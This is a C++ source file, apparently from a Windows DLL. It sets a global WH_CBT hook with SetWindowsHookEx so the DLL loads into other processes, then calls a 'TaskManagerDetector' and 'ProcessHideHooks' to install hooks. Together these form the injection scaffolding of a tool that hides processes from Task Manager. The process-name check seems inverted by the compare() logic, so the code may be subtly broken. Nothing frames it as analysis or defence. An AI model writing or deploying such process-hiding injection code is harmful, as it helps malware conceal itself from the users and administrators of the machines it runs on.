#include "stdafx.h"
#include "ProcessHideHooks.h"
#include "TaskManagerDetector.h"
#include "Utils.h"

extern HMODULE hCurrentModule;
HHOOK g_hook = nullptr;

static LRESULT CALLBACK HookProc(int    nCode, WPARAM wParam, LPARAM lParam)
{
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

bool InstallHooks()
{
    if (toLowerW(GetCurrentProcessName()).compare(L"tskmng.exe"))
    {
        if (!TaskManagerDetector::GetInstance()->InstallHooks())
        {
            return false;
        }
    }

    return true;
}

bool Start()
{
    g_hook = SetWindowsHookEx(WH_CBT, HookProc, hCurrentModule, 0);

    if (g_hook == 0)
    {
        return false;
    }
    return true;
}



